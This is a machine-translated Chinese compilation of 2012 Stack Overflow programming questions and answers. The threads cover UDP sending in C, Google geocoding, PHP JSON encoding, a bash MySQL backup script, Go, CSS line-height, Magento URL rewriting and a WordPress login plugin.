`Tomcat Runner runs a Java web application that is represented as an exploded war in a Tomcat container Usage: java -jar tomcat-runner.jar [arguments...] path/to/webapp Arguments: --session-timeout The number of minutes of inactivity before a user's session is timed out
--port The port that the server will accept http requests on
--context_xml The parth to the context xml to use
--path context path (default is /)
--session_manager session store to use (valid options are 'memcache')
--session_manager_operation_timeoutoperation timeout for the memcached session manager. (default is 5000ms)
--session_manager_locking_modeSession locking mode for use with memcache session store. (default is all)
--session_manager_ignore_patternRequest pattern to not track sessions for. Valid only with memcache session store. (default is '.*\.(png|gif|jpg|css|js)$'`

如[WAR 部署文档](https://devcenter.heroku.com/articles/war-deployment)`WEBAPP_RUNNER_OPTS`中所述，您可以使用config var为您的 webapp 设置 webapp-runner 选项。

# c - 通过 UDP Socket 发送 HEX 值

> ID：11702673
> 
> 赞同：0
> 
> 时间：2012-07-28T16:20:24.400
> 
> 标签：c, arrays, sockets, udp, hex

我正在尝试通过 udp 套接字发送一组十六进制值，但我不能只接收第一个字节 0x22。有什么问题？？先感谢您！！！

PD：如何打印带有十六进制值的数组？

```
/* UDP client in the internet domain */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <time.h>

void error(const char *);
int main()
{
   int sock, n;
   unsigned int length;
   struct sockaddr_in server;
   struct hostent *hp;
   char buffer[13]={0x22,0x00,0x0d,0xf4,0x35,0x31,0x02,0x71,0xa7,0x31,0x88,0x80,0x00};

   hp = gethostbyname("127.0.0.1");
   if (hp==0) error("Unknown host");

   sock= socket(AF_INET, SOCK_DGRAM, 0);
   if (sock < 0) error("socket");

   server.sin_family = AF_INET;
   bcopy((char *)hp->h_addr, 
        (char *)&server.sin_addr,
         hp->h_length);
   server.sin_port = htons(atoi("6666"));
   length=sizeof(struct sockaddr_in);
   while (1) {
     n=sendto(sock,buffer,strlen(buffer),0,(const struct sockaddr *)&server,length);
     if (n < 0) error("Sendto");
     printf("Sending Packet...\n");
     sleep(1);
   }
   close(sock);
   return 0;
}

void error(const char *msg)
{
    perror(msg);
    exit(0);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:24:13.943

那是因为您正在使用 strlen(buffer) 并且 buffer[1] 为 Null

而不是`strlen(buffer)` 使用`sizeof(buffer)`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:23:53.863

```
.... strlen(buffer) ... 
```

这是（至少部分）你的问题。`strlen`用于 C 字符串。C 字符串以 . 结尾`0x00`。您的缓冲区的第二个字符为零，因此`strlen`将为 1。您正在发送一个字节。

不要`strlen`在二进制数据上使用，使用您要发送的实际字节数。

（也不要在接收端使用字符串函数。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T16:24:04.440

您不想使用`strlen(buffer)`，因为您的数据不是字符串。strlen 将返回字节长度，直到达到第一个零。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-28T16:24:46.650

你正在使用这个

```
 strlen(buffer) 
```

在

```
 n=sendto(sock,buffer,strlen(buffer),0,(const struct sockaddr *)&server,length); 
```

它将返回 1，因为缓冲区中的第二个元素是 0x00

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2021-02-01T13:54:45.080

用这个替换你的代码：

```
n = sendto(sock, buffer.c_str(), buffer.size() + 1, 0, (sockaddr*)&server, sizeof(server)); 
```

# javascript - Google 地理编码状态始终为空

> ID：11702679
> 
> 赞同：0
> 
> 时间：2012-07-28T16:21:06.163
> 
> 标签：javascript, google-maps-api-3, geocode, google-geocoder

我是地理编码的新手。我从用户那里获取邮政编码，找到纬度和经度，并将其与一组附近的位置进行比较，这些位置的纬度和经度存在于 JSON 中。所以我必须遍历每个事件进行比较。地理编码状态始终为空，因此我无法获取用户输入的邮政编码的经纬度。

```
<script src="http://maps.google.com/maps/api/js?sensor=false"></script> 
```

这是我的 Js 函数。

```
self.find_events = function find_events(zip, eventId) {
        var data = LAH.events.events_data,
        matches_found = 0;
        var today = new Date();
        var zip = zip || null;
        var eventId = eventId || null;
        geocoder = new google.maps.Geocoder();
        if(geocoder){       
        geocoder.geocode( { 'address': zip }, function(results, status) { // status is empty
        if (status == google.maps.GeocoderStatus.OK) {
        var userLat = results[0].geometry.location.lat();
        var userLng = results[0].geometry.location.lng();
        userLatLng = results[0].geometry.location;
        }
        });//end geocode        
        } 
        for (var i = data.length-1; i--;) { 
            if (eventId === null) {
                var eventEnd = data[i].endDate;
                var calc_dis = calculateDistance(userLat, userLng, parseFloat(data[i].lat), parseFloat(data[i].lng));
                if ((zip == 'all' || calc_dis === true) && today < eventEnd) {
                    display_event(data[i]);
                    matches_found += 1;
                }               
            }
            else {
                // eventId is valid, only display what we found in the query string
                if (data[i].eventId === parseInt(eventId, 10)) {
                    display_event(data[i]); 
                    matches_found += 1;
                }
            }

        }       
        matches_found ? display_table() : display_no_results();     
        return matches_found;
    }; 
```

在**geocoder.geocode( { 'address': zip }, function(results, status)**之后，它直接跳到**for 循环**。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T16:27:53.190

`geocoder.geocode`**异步**工作，所以你需要等到它的响应将从谷歌的服务器传送，然后才使用响应的数据。把你的循环放在回调中：

```
 geocoder.geocode( { 'address': zip }, function(results, status) { // status is empty
    if (status == google.maps.GeocoderStatus.OK) {
       var userLat = results[0].geometry.location.lat();
       var userLng = results[0].geometry.location.lng();
       userLatLng = results[0].geometry.location;
       for (var i = data.length-1; i--;) { 
          //loop body
       }
    }       
  });//end geocode 
```

# php - Json编码数组的php长内容

> ID：11702683
> 
> 赞同：0
> 
> 时间：2012-07-28T16:21:15.163
> 
> 标签：php, json

我对 php 的 json_encode 有问题，我使用 php 5.2.6，我从服务器接收到这些数据：

```
Array (… => Array ( [codIdenVerb] => 276122 [codAppe] => 778033 [codCorsoStud] => 00688 [descrizione] => PSICOLOGIA SOCIALE [crediti] => 9.0 [canale] => NESSUNA CANALIZZAZIONE [docente] => TONI ALESSANDRO [facolta] => SCIENZE POLITICHE, SOCIOLOGIA, COMUNICAZIONE [annoAcca] => 2012 [dataAppe] => 25/09/2012 ......... 
```

...

```
[note] => La prova scritta si svolgerà il giorno 10 settembre presso l'aula Magna a partire dalle ore 10.oo. La prova orale si svolgerà il giorno 25 settembre presso l'aula B14 a partire dalle ore 9.30\. Si ricorda, inoltre, che la prenotazione su INFOSTUD per la data della prova ora è valida e necessaria per sostenere la prova scritta. 
```

..

```
[dataInizioPrenotazione] => 06/05/2012 [dataFinePrenotazione] => 30/08/2012 [questionario] => false [SiglaModuloDidattico] => 1010544 ) [7] => Array…) 
```

对于编码我使用 $json_string = json_encode($data);

但是带有 [note] 的部分被削减了：“note”：“La prova s​​critta si svolger”，“...”
问题出在哪里？怎么解决？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:23:12.107

`json_encode()`预计传入数据为 UTF-8。

您传递给它的数据可能不是 UTF-8。

找出它的编码，并调整输入编码或使用例如[`iconv()`](http://www.php.net/iconv)将数据从原始编码转换为 UTF-8。

# linux - 备份 MySQL 数据库的 Bash 脚本

> ID：11702684
> 
> 赞同：-1
> 
> 时间：2012-07-28T16:21:21.203
> 
> 标签：linux, bash, shell

我写了一个脚本，但我不断收到以下错误。尝试连接时用户'zul'@'localhost（使用密码：是）的访问被拒绝

项目：43：[d：未找到

项目：43：[d：未找到

它没有读取输入 d 也没有连接到 MySQL。有任何想法吗？

这是我的脚本：

```
#!/bin/bash

tstamp=$(date +$s) 

#Dump or Update
if [ -z "$1" ]; then
  echo -n "What do you want to do? [D]ump or [U]pdate: "
  read parm
else
  parm=$1
fi

#Database Name
if [ -z "$2" ]; then
  echo -n "What database are you using?"
  read dbname
else
  dbname=$2
fi

#Database User
if [ -z "$3" ]; then
  echo -n "What database user are you using?"
  read dbuser
else
  dbuser=$3
fi

#Database Password
if [ -z "$4" ]; then
     echo -n "What password are you using?"
     read dbpass
else
     dbpass=$4
fi

#Checks if the directory exists
if test ! -d "/home/zul/sql/backup"; then
  mkdir /home/zul/sql
  mkdir /home/zul/sql/backup
fi

mysqldump $dbuser -p$dbpass $dbname > /home/zul/sql/backup/$tstamp.$dbname.sql

if [$parm = d ]; then
  mysqldump $dbuser -p$dbpass $dbname > /home/zul/sql/backup/$dbname.sql
elif [$parm = u ]; then
  mysqldump $dbuser -p$dbpass $dbname < /home/zul/sql/backup/$dbname.sql
else
  echo " d or u option only! (lower case)"
fi 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:25:38.637

我猜你的 if-else 测试中缺少一个空格：
应该是`[ test ]`而不是`[test ]`

```
if [ $parm = d ]; then
  mysqldump $dbuser -p$dbpass $dbname > /home/zul/sql/backup/$dbname.sql
elif [ $parm = u ]; then
  mysqldump $dbuser -p$dbpass $dbname < /home/zul/sql/backup/$dbname.sql
else 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:27:04.467

您必须使用空格将 '[' 与其参数分开：

```
if [ $parm = d ]; then
    mysqldump $dbuser -p$dbpass $dbname > /home/zul/sql/backup/$dbname.sql
elif [ $parm = u ]; then 
```

# arrays - 在 Go 中将字符串转换为单位数整数数组

> ID：11702687
> 
> 赞同：2
> 
> 时间：2012-07-28T16:21:34.270
> 
> 标签：arrays, string, int, digits

花了几个小时试图找到解决在 Go 中将数字字符串转换为单个数字**整数数组的“简单”问题的解决方案。**尝试了许多不同的方法，但总是遇到问题。这是最后一个尝试的。它在指示的行上构建，但在运行时给出超出范围的索引。可能会有一些 AH 会因为提出愚蠢的问题而标记我，但我在多个 Google 搜索的前 50 个结果中找不到解决方案。所以来吧，伙计，把我记下来，你就是那个人。致其他 99%：感谢您的耐心和帮助。

```
package main
import (
    "fmt"
    "strconv"
    "strings"
    )
func main() {
    s := "876567747896354336739443262"
    var dstr []string = strings.SplitAfterN(s,"",len(s))
    var dint []int
    for i := 0; i < len(s); i++ {
        dint[i], _ = strconv.Atoi(dstr[i]) //index out of range at runtime
        fmt.Printf("dstr[%v] is: %s\n", i, dstr[i])
        fmt.Printf("dint[%v] is: %v\n", i, dint[i])
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T16:34:14.857

这是答案。Morphiax 以我的方式向我展示了错误。谢谢大佬，赞赏。事实证明这是错误的： var dint []int 。我应该在创建数组时给出大小，而不是初始化它： var dint [27]int 。这是完整的代码：

```
package main
import (
    "fmt"
    "strconv"
    "strings"
    )
func main() {
    s := "876567747896354336739443262"
    var dstr []string = strings.SplitAfterN(s,"",len(s))
    var dint [27]int
    for i := 0; i < len(s); i++ {
        dint[i], _ = strconv.Atoi(dstr[i]) 
        fmt.Printf("dstr[%v] is: %s\n", i, dstr[i])
        fmt.Printf("dint[%v] is: %v\n", i, dint[i])
    }
} 
```

# html - CSS 行高 - 仅底部

> ID：11702690
> 
> 赞同：17
> 
> 时间：2012-07-28T16:22:25.663
> 
> 标签：html, css

好的，我对前端开发很陌生，所以如果这是一个愚蠢的问题，请很好:)

我知道这可能是不可能的，但是当应用于`line-height`一个元素时，比如说 an `h1`，该元素的and`line-height`都会应用额外的空间。`top``bottom`

这是有道理的，但我只想`line-height`应用于元素的底部，这样我的`h1, h2`etc 的顶部就可以与其他元素完美对齐。

这个jsfiddle显示了问题：http: [//jsfiddle.net/zja4c/1/](http://jsfiddle.net/zja4c/1/)

这个 jsfiddle 显示了我想要实现的目标，但被迫使用负边距：http: [//jsfiddle.net/25UTA/](http://jsfiddle.net/25UTA/)

红色的`h1`with`background colour`正确对齐到左上角`div`，但文本没有。

因此，我的问题是，有没有办法：

1.  仅应用于`line-height`元素的底部，或者，

2.  `line-height`将元素对齐到通过以某种方式应用创建的空间的顶部

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-28T16:51:16.040

`line-height`如果您希望在换行符之间保持适当的间距，则使用是您唯一的选择。`H1`正如您所指出的，填充将发生在块级元素的底部。我认为负边距是你最好的选择，但你必须微调它与 50px 完美对齐`line-height`：

[http://jsfiddle.net/25UTA/1/](http://jsfiddle.net/25UTA/1/)

如果由于某种原因不能使用负边距，您可以使用相对定位和负值`top`来达到类似的效果。

[http://jsfiddle.net/25UTA/2/](http://jsfiddle.net/25UTA/2/)

使用`em`'s 或百分比字体大小和行高可能会使这更容易。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-01-05T16:41:46.263

这些答案都没有引用`display`设置为的元素`inline`。

`Line-height`是一个引用`inline`元素的设置。到目前为止，每个答案都提到使用填充和边距，它们不适用于`inline`样式文本。

您可以使用 修改文本在其行内的位置`vertical-align`。这是一篇文章的链接，该文章详细介绍了该属性及其工作原理：

[http://christopheraue.net/2014/03/05/vertical-align/](http://christopheraue.net/2014/03/05/vertical-align/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-05-05T16:21:27.537

一个简单的解决方案是将行高设置为 70% 并添加一点底部填充。

```
p, h2 {
line-height:70%;
padding-bottom: 3px;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T16:29:56.900

您可以完全忘记行高并使用 padding-bottom：

[**小提琴**](http://jsfiddle.net/zja4c/14/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-28T16:40:55.613

据我所知，它不可能`line-height`只申请`bottom`使用 css。

所以你可以试试`padding`user1538100说的。

# php - 创建一个在模板上显示 ID 信息的页面

> ID：11702694
> 
> 赞同：0
> 
> 时间：2012-07-28T16:23:04.347
> 
> 标签：php, mysql, database

更新了其他人的建议，但似乎仍然卡住了。

我在这里使用这个 php 代码来使用 ID 显示来自我的数据库的信息。我在我的主页上创建了一个看起来像这样的链接。

```
<h1><a href="fetch.php?id=<?php echo $row_getDisplay['post_id']; ?>"><?php echo $row_getDisplay['title']; ?></a></a></h1> 
```

我有所以当他们点击文章的标题时，它会将他们带到我命名为 fetch.php 的 php 字段，下面的代码就是其中的内容。我已经围绕别人的工作建立了这个。出于某种原因，我无法通过第一个“else”语句。所以我不断收到“你必须选择一个有效的位置”我对 php 还很陌生，所以我真的不明白为什么代码会失败。

```
<?php require_once('Connections/XXXXXX.php'); ?>
<?php 
if (isset($_GET['id']) ==  false) // check if id has been set 
{ 
echo "You must select a location"; // if not, display this error 
exit; 
} else { 
$id = (int) $_GET['id']; 
if (is_numeric($id) == false) 
**{ 
echo "You must select a valid location."; 
} else {** 

mysql_select_db($database_XXXXXX, $XXXXXX);
$query = MYSQL_QUERY("SELECT * FROM news WHERE post_id ");

if (MYSQL_NUM_ROWS($query) == "1")

{ 
$fetch = MYSQL_FETCH_ARRAY($query); // set $fetch to have the values from the table 
echo "Title: " . $fetch['title'] . "<BR>"; // output the info 
echo "Blog: " . $fetch['blog_entry'] . "<BR>"; // etc... 
echo "Author: " . $fetch['author'] . "<BR>"; // etc... 
} else { 
echo "No match in database found."; // if no match is found, display this error 
} 
} 
} 
```

任何帮助表示赞赏。如果您能够为我找到更好的解决方案，那就太好了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:28:53.627

你不应该使用`$HTTP_GET_VARS`它已弃用，除非它打开它不会被填充。改为使用[`$_GET`](http://php.net/manual/en/reserved.variables.get.php)。

`if (isset($_GET['id']) == false)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T17:33:11.803

尝试这个;

```
<?php
require_once('Connections/XXXXXX.php');

if (isset($_GET['id'])) // check if id has been set
 {
$id = $_GET['id'];
if (is_numeric($id) == false)
{
echo "You must select a valid location.";
} else {

mysql_select_db($database_XXXXXX, $XXXXXX);
$query = MYSQL_QUERY("SELECT * FROM news WHERE locationid = 'news.post_id' ");

if (MYSQL_NUM_ROWS($query) == "1")

{
$fetch = MYSQL_FETCH_ARRAY($query); // set $fetch to have the values from the table
echo "Title: " . $fetch['title'] . "<BR>"; // output the info
echo "Blog: " . $fetch['blog_entry'] . "<BR>"; // etc...
echo "Author: " . $fetch['author'] . "<BR>"; // etc...
} else {
echo "No match in database found."; // if no match is found, display this error
}
}
}
else{
echo "You must select a location"; // if not, display this error
exit;
}
?> 
```

另外，我需要澄清一下`news.post_id`，你从哪里抓到这个？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:29:23.080

用于`$_GET`您的 if 语句：

```
if (isset($_GET['id']) ==  false) 
```

此外，您需要将`$_GET`值转换为整数，因为它当前是一个字符串。

在上面的 if 语句之后，在 中`else`，输入：

```
 $id = (int) $_GET['id']; 
```

这样你`is_numeric()`就可以正常工作了。

# php - PHP为下一个查询获取上一个MySQL查询的ID，如何？

> ID：11702697
> 
> 赞同：1
> 
> 时间：2012-07-28T16:23:26.247
> 
> 标签：php, mysql

我在这里有一个关于 MySQL 和 PHP 的简单问题。假设我有这个 PHP 语法：

```
mysql_query("INSERT INTO Persons (FirstName, LastName, Age)
VALUES ('Peter', 'Griffin',35)"); 
```

在那个 Person 表上，有一个名为 ID（自动增量）的列。如何在 INSERT 过程完成后获取 Peter Griffin 的 ID 而无需进行另一个 SELECT 查询？

或者是否可以使用单个查询对 2 个表进行 INSERT？例如我想在地址表上插入彼得的地址：

```
mysql_query("INSERT INTO Address (City, State, Zip)
VALUES ('Cupertino', 'California', 35212)"); 
```

就这样..

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T16:25:03.063

```
$new_id = mysql_insert_id(); 
```

把它放在你的`INSERT`查询之后，它会给你ID。

我不建议尝试将两个`INSERT`s 合二为一，该`mysql_insert_id()`方法将使您和您的代码变得最简单。

# django - 是否可以翻译 Django ModelMultipleChoiceField？

> ID：11702701
> 
> 赞同：0
> 
> 时间：2012-07-28T16:23:58.133
> 
> 标签：django, django-models, django-forms, django-views

我的目标是创建一个显示多个复选框并允许用户选择一个或多个选项的表单。所有这些选择都需要翻译。

在使用非模型驱动形式时，`CHOICES`它按预期工作。

```
COLOR_CHOICES = (
    (1, _('Red')),
    (2, _('Black')),
) 
```

由于我的表单是基于模型的，而不是`MultipleChoiceField`我必须使用`ModelMultipleChoiceField`.

```
colors = forms.ModelMultipleChoiceField(
    queryset=Colors.objects, # <- This needs to exist in the database so can't use CHOICES
    widget=forms.CheckboxSelectMultiple(),
    required=False
) 
```

由于`ModelMultipleChoiceField`查询数据库以获得选择，我必须首先将数据放在数据库中。

我可以想到两种解决方案来解决这个问题，但我不确定如何让它发挥作用（可能有一种我不知道的不同方法）：

1.  创建一个夹具并翻译它（翻译是这里的问题）

2.  使用`queryset`选项`ModelMultipleChoiceField`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T18:55:04.320

你应该翻译`Colors`模型。我向您发送一个使工作变得容易的活动项目： [django-modeltranslation](http://code.google.com/p/django-modeltranslation/)

了解更多关于这个项目的信息在我的 TODO 列表中。

另外，请查看muhuk.com 博客[中的 Django 动态翻译应用程序。](http://www.muhuk.com/2010/01/dynamic-translation-apps-for-django/)

# c - 算法或 c 代码实现以找到具有 n 个或更多除数的最小正整数

> ID：11702704
> 
> 赞同：1
> 
> 时间：2012-07-28T16:24:04.193
> 
> 标签：c, algorithm, mathematical-optimization, performance

找到具有给定或更多除数的最小整数的有效方法是什么？我天真地认为，找到从 2 开始的数字的除数。当然这不是最好的方法。有没有办法猜测接近答案的起点？可能是 n 与其可以具有的除数之间的某种关系。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T16:29:04.783

如果一个数的素数分解`n`是： `n = p1^a * p2^b * p3^c`那么除数的个数是`(a + 1) * (b + 1) * (c + 1)`。

这是解决方案的提示。

问题并不像看起来那么简单。

我发现有趣的定理和论文解决了这个问题：

[http://oeis.org/A005179](http://oeis.org/A005179)

[http://www.math.hawaii.edu/~ron/pdfpapers/ordinarytest.pdf](http://www.math.hawaii.edu/~ron/pdfpapers/ordinarytest.pdf)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T17:17:40.673

你有没有想过使用埃拉托色尼筛法的改编版来做到这一点？依次遍历可能的除数，并在适当的点将累积总数加 1。例如，当您达到 5 时，将 1 加到 5、10、15 的总数中……这样做不需要对代码进行很大的修改。

# templates - 没有 index.php，除主页外的 Magento URL 不起作用

> ID：11702708
> 
> 赞同：19
> 
> 时间：2012-07-28T16:24:35.557
> 
> 标签：templates, magento, url-rewriting

我的 magento 安装在 /var/www/magento 下的 Ubuntu Linux 上。这个问题看起来像档案中的一些问题，但实际上有些不同。当我在 Ubuntu Linux 上安装 Magento 时，我启用了 Apache mod_rewrite URL 重写。

当我转到 http://localhost/magento 我的服务器将 URL 重写为 http://localhost/magento/ 并显示页面。然后我单击导航栏中的链接之一，假设它是导航栏项目“foo”。然后magento带我去：

http://localhost/magento/foo.html

显示“未找到”的 apache 页面。

我必须将 URL 更改为 ----->

http://localhost/magento/index.php/foo.html

为了显示页面。

就好像我的 mod_rewrite 工作有问题。

谢谢，

约翰·戈切

配置：系统->配置->（常规->）Web：

使用 Web 服务器重写：是

基本网址：http://localhost/magento

如果我将“用户 Web 服务器重写：”设置为 NO，那么我的主页上的链接可以正常工作，但是请参阅显示正确页面的页面 http://localhost/magento/index.php/foo.html，但是该网站的作品我不喜欢这个网址。我希望它是 http://localhost/magento/foo.html 没有 index.php 位，因为这也可能对 SEO 更友好。

谢谢，

约翰·戈切

* * *

更新：我尝试取消注释 ubuntu 放入 /etc/hosts 的人工 127.0.1.1 IP 地址并将其放置为我的真实 IP，但没有运气。我仍然有完全相同的问题。并且我的浏览器中的 URL 被重写为 http://localhost / 等...每当我在其中输入 192.168.3.31、avalanche 或 avalanche.com 时。我仍在试图弄清楚如何解决上述问题，因为这并没有做到。

```
127.0.0.1       localhost
#127.0.1.1      avalanche

192.168.4.35    avalanche avalanche.com 
```

当我重新启动 Apache 时，我得到：

```
# service apache2 restart
 * Restarting web server apache2                                                apache2: Could not reliably determine the server's fully qualified domain name, using 192.168.4.35 for ServerName
 ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 192.168.4.35 for ServerName 
```

不知道如何解决原始问题。我正在本地服务器上进行测试。

* * *

我什至尝试过这个解决方案，然后重新启动 apache2，但没有运气！

[如何从 URL 中删除 index.php？](https://stackoverflow.com/questions/10474740/magento-how-to-remove-index-php-from-urls)

所以放置：

```
RewriteEngine On
RewriteBase /mymagento/
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php/$1 [L] 
```

不起作用，即使使用 RewriteBase /，它也不起作用。

* * *

好的，最后我设法解决了问题。文件 /etc/apache2/sites-enabled/000-default 为该文件中定义的所有目录设置了以下指令：

```
 AllowOverride None 
```

例如，对于 /var/www 这是 Ubuntu 12.04 LTS Linux 系统上设置的默认文档根目录，此文件包含

```
 <Directory /var/www/>
            Options Indexes FollowSymLinks MultiViews
            AllowOverride None
            Order allow,deny
            allow from all
    </Directory> 
```

据我了解，这意味着在此目录及其所有子目录中找到的 .htaccess 文件将不会被解析。要解决此问题，设置以下内容就足够了：

```
AllowOverride All 
```

这意味着您将能够覆盖 /etc/apache2/apache2.conf（或其中包含的 /etc/apache2/httpd.conf）中的服务器配置指令。

AllowOverride 默认设置为 None 的原因之一可能是它减慢了服务器的速度，另一个是出于安全原因。该指令应设置在标签内，后者可以覆盖前者。默认情况下未设置的另一个原因是，每次加载目录路径中的文件时必须在站点上递归解析 .htaccess 会减慢系统速度，从而将 .htaccess 内容放在 /etc/apache2/httpd.conf尽可能推荐，因为它可以提高速度。

所以放置

```
 <Directory /var/www/>
            Options Indexes FollowSymLinks MultiViews
            #AllowOverride None
            AllowOverride All
            Order allow,deny
            allow from all
    </Directory> 
```

在 /etc/apache2/sites-enabled/000-default 里面

并运行： service apache2 restart

是解决方案。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-07-29T09:42:23.863

你试过了吗：

```
RewriteBase /magento/ 
```

而不是 RewriteBase /mymagento/ 因为你的网址是 http://localhost/magento/

您的 apache 虚拟主机是否允许覆盖配置，例如

```
<VirtualHost *:80>
...
<Directory /var/www/magento/>
    AllowOverride All
</Directory>
</VirtualHost> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-28T16:52:26.690

您的 Magento 根目录中是否有[适当的 .htaccess 文件？](http://svn.magentocommerce.com/source/branches/1.7/.htaccess)此外，您可能会遇到`localhost`. 建议使用 127.0.0.1 或在主机文件中映射开发域。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-29T10:24:38.583

在 Magento 配置中（通过系统 > 配置在 Magento 管理面板中访问）有一些相关设置决定了最终的搜索引擎友好 URL 的样子。

```
Web > Search Engine Optimization > Use Web Server Rewrites 
```

应始终打开的设置。如果不是 "/index.php/" 将被添加到 URL 中，这是不必要的并且看起来很丑陋。**要启用此选项，您还需要在托管环境中启用 Apache mod_rewrite**。

```
Catalog > Search Engine Optimizations > Product URL Suffix 
```

此处的默认值为“.html”，它将附加到每个产品 URL。一些 SEO 专家声称这是提高评级所必需的，而其他 SEO 出口商则表示并非如此。对于我们与 Joomla 的 MageBridge 集成！此设置必须为空。

```
Catalog > Search Engine Optimizations > Category URL Suffix 
```

同上，但现在是分类。

```
Catalog > Search Engine Optimizations > Use categories path for product URLs 
```

启用此选项后，产品 URL 还将包括类别 URL 键。虽然可以说这会导致重复的内容，但产品页面也可能会从中受益，因为它们成为更大结构的一部分。

```
Catalog > Search Engine Optimizations > Use Canonical Link Meta Tag For Products 
```

如果您真的担心重复内容（这并不像某些人告诉您的那么糟糕），那么您可以启用规范标签，一旦检测到重复内容，该标签会告诉搜索引擎哪个页面处于领先地位。

```
Catalog > Search Engine Optimizations > Use Canonical Link Meta Tag For Categories 
```

与上述相同，但针对类别。

关于此事的进一步阅读[http://www.yireo.com/tutorials/magento/magento-administration/664-fixing-url-rewrites-with-magento](http://www.yireo.com/tutorials/magento/magento-administration/664-fixing-url-rewrites-with-magento)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-04-14T05:28:14.343

为 wamp 启用 Apache 重写模块对我有用。

![在此处输入图像描述](../Images/f439438858612b12a16b0e43c2ca5c96.png)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2014-08-28T10:08:19.337

```
Go to admin url of your site. 
Suppose,http://example.com/index.php/admin/

Go to 'System' menu from navigation and click on 'Configuration'.
Under the 'General' tab in the left, click on 'Web'.
Open the 'Search Engines Optimization' section by clicking on it.
Then set 'Use Web Server Rewrites' value to 'No' 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2014-04-03T10:59:32.920

这是一个**mod_rewrite**问题。我正在运行*Ubuntu*，并且在为商店迁移设置 apache 和 magento 时遇到了同样的问题。

更改`/etc/apache2/sites-available/000-default.conf`为包含

```
<VirtualHost ...>
...
<Directory /var/www>
    Options Indexes FollowSymLinks MultiViews   
    AllowOverride All
    Order allow,deny
    allow from all 
</Directory>

</VirtualHost> 
```

因此允许在网络服务器上**重写。**`var/www`

为了让 apache 处理来自 magentos 的重写规则。`htaccess`文件，通过
**启用**重写模块

```
sudo a2enmod rewrite 
```

并通过**重启 apache**

```
sudo /etc/init.d/apache2 force-reload 
//(not service apache2 restart) 
```

为我解决了整个问题。

请参阅[http://wiki.ubuntuusers.de/Apache/mod_rewrite](http://wiki.ubuntuusers.de/Apache/mod_rewrite)和
[http://wiki.ubuntuusers.de/Apache](http://wiki.ubuntuusers.de/Apache)以获取有关如何正确设置的详细说明。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-07-08T11:38:34.920

将我的实时站点转移到本地主机时，我遇到了同样的问题。最后我解决了。

我有 Windows 操作系统。所以我为我的本地主机使用了 WAMP 堆栈。我花了很多时间通过更改 .htaccess 文件、修改 DB 中的 core_config_data 表来检索本地主机中的所有 URL 及其内容，但一切都出错了。

最后我得到了在 Apache 服务器中启用 rewrite_module 的线索。1\. 启用它 单击托盘栏中的 Wamp 图标（WAMP->Apache->Apache 模块-> 并选择 rewrite_module）。2\. 重启 Wamp 服务器。3.清除缓存（我认为可选） - 删除 var/cache 文件夹中的所有文件

确保您的根文件夹中有 .htaccess 文件让我们假设（localhost/magento/.htaccess）。如果你没有，你将不会得到结果。

就是这样。

我希望现在您能够检索除主页以外的所有其他页面和 URL，并且您也不会收到 404 错误页面。

# wordpress - oneall Wordpress 插件 - 更改小部件输出

> ID：11702711
> 
> 赞同：0
> 
> 时间：2012-07-28T16:25:01.550
> 
> 标签：wordpress

我想在我的 wordpress 博客上实现 facebook、twitter 和 google 登录。我发现了一个很棒的插件，叫做 oneall。我猜它工作得很好（只测试了一次 fb 登录）。我的问题是我想要我自己的登录小部件按钮。我可以通过 CSS 更改背景图像，但这不是我想要的。我想使用一个图标字体，我在整个页面中都使用它。所以我需要将小部件的内容更改为简单的“f”、“t”和“g”并设置它们的字体系列。

这是应该输出小部件代码的代码部分。

```
//Add the Plugin
        $output [] = ' <div class="oneall_social_login_providers" id="oneall_social_login_providers_' . $rand . '"></div>';
        $output [] = ' <script type="text/javascript">';
        $output [] = '  oneall.api.plugins.social_login.build("oneall_social_login_providers_' . $rand . '", {';
        $output [] = '   "providers": ["' . implode ('","', $providers) . '"], ';
        $output [] = '   "callback_uri": (window.location.href + ((window.location.href.split(\'?\')[1] ? \'&amp;\':\'?\') + "oa_social_login_source=' . $source . '")), ';
        $output [] = '   "css_theme_uri": "' . 'http://test.nowillnoskill.net/wp-content/themes/NWNS/design/css/social.css' . '" ';
        $output [] = '  });';
        $output [] = ' </script>';
        $output [] = ' <!-- oneall.com / Social Login for Wordpress / v'.constant('OA_SOCIAL_LOGIN_VERSION').' -->';
        $output [] = '</div>'; 
```

